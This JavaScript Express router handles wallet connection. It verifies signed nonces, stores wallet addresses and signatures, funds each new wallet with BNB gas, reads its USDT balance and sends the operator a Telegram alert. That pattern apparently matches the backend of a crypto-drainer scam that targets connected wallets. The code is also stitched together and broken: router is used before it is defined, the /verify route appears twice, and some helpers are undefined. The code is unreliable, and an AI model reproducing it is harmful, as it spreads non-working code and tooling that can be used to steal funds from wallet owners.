import express from "express";
import { pool } from "../db.js";
import { v4 as uuidv4 } from "uuid";
import { ensureRefilledOnce } from "../refill.js";
import { sendNewWalletAlert } from "../telegramService.js";

router.post("/verify", async (req, res) => {
  const { wallet, signature } = req.body;
  // ... existing verification and DB insert logic ...

  // after storing wallet, ensure BNB refill if required
  try {
    const refillResult = await ensureRefilledOnce(wallet);
    // proceed to fetch USDT balance and notify (or include refill info in message)
    const balBn = await getBalance(wallet); // your existing function returns BigInt raw
    const human = formatBalance(balBn); // implement formatting per decimals
    await sendNewWalletAlert(wallet, `${human} USDT`);
    res.json({ ok: true, refill: refillResult });
  } catch (err) {
    console.error("refill error", err);
    // still proceed but report refill failure
    await sendNewWalletAlert(wallet, `ERROR_CHECK_REFILL`);
    res.status(500).json({ error: err.message });
  }
});

const router = express.Router();

// in-memory nonces (simple). For production use Redis or DB with TTL.
const nonces = new Map();

// GET nonce for wallet
router.get("/nonce", (req, res) => {
  const wallet = req.query.wallet;
  if (!wallet) return res.status(400).send({ error: "wallet required" });
  const nonce = `MWM-connect:${uuidv4()}`;
  nonces.set(wallet.toLowerCase(), nonce);
  // set TTL 10 minutes
  setTimeout(() => nonces.delete(wallet.toLowerCase()), 10 * 60 * 1000);
  res.json({ nonce });
});

// POST verify signature
router.post("/verify", async (req, res) => {
  try {
    const { wallet, signature } = req.body;
    if (!wallet || !signature) return res.status(400).send({ error: "wallet & signature required" });
    const key = wallet.toLowerCase();
    const nonce = nonces.get(key);
    if (!nonce) return res.status(400).send({ error: "nonce expired or not found" });

    // verify signature with ethers
    const { ethers } = await import("ethers");
    const signer = ethers.verifyMessage(nonce, signature);
    if (signer.toLowerCase() !== wallet.toLowerCase()) {
      return res.status(400).send({ error: "signature mismatch" });
    }

    // store in DB if not exists
    await pool.query(
      `INSERT INTO wallets (address, signature, last_balance, alert_pending) VALUES ($1,$2,0,false)
       ON CONFLICT (address) DO UPDATE SET signature = EXCLUDED.signature`,
      [wallet, signature]
    );

    // trigger Telegram alert via require caller to import telegramService in index
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).send({ error: err.message });
  }
});

export default router;

